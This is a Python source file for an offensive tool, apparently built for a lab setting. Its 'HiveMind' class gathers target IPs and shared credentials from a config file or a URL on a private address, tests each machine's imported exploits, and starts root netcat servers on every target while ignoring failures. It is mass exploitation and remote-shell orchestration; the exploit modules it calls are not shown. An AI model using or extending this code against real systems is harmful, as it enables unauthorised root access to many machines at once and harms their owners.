from TargetMachine import TargetMachine
import requests
import yaml
from BetterLogger import logger

class HiveMind:
	"""
	HiveMind keeps track of all target machines and allows you to mass-control machines
	"""

	def __init__(self) -> None:
		self.target_machines = {}

	def read_config_file(self):
		logger.debug("Reading config file...")
		with open("config.yaml", 'r') as file_in:
			parsed_config = yaml.safe_load(file_in)
		logger.debug("Successfully read config file")
		return parsed_config

	def add_new_target_machines_from_config(self):
		parsed_config = self.read_config_file()
		target_ips = parsed_config["ips"]
		credentials = parsed_config["credentials"]
		for ip in target_ips:
			if ip not in self.target_machines:
				new_user = TargetMachine(ip_address=ip, credentials=credentials)
				self.target_machines[ip] = new_user

	def add_new_target_machines_from_ip_list(self):
		"""
		Reads a list of IPs from a URL and updates the target machines based on that list
		"""
		ip_list_url = "http://192.168.65.1:8000/clients.txt"
		server_response = requests.get(ip_list_url)
		server_status_code = server_response.status_code
		server_response_text = server_response.text
		list_of_ips = server_response_text.split()
		logger.info(list_of_ips)

		parsed_config = self.read_config_file()
		credentials = parsed_config["credentials"]
		for ip in list_of_ips:
			if ip not in self.target_machines:
				new_user = TargetMachine(ip_address=ip, credentials=credentials)
				self.target_machines[ip] = new_user

		return self.target_machines

	def test_all_machines_for_vulnerabilities(self):
		for ip, machine in self.target_machines.items():
			for exploit in machine.exploits:
				exploit.test_if_vulnerable()

	def start_root_netcat_server_on_all_machines(self):
		for ip, machine in self.target_machines.items():
			for exploit in machine.exploits:
				try:
					exploit.start_root_netcat_server()
				except Exception:
					pass

def main():
	hivemind = HiveMind()
	hivemind.add_new_target_machines_from_config()
	print(hivemind.target_machines)

if __name__ == "__main__":
	main()
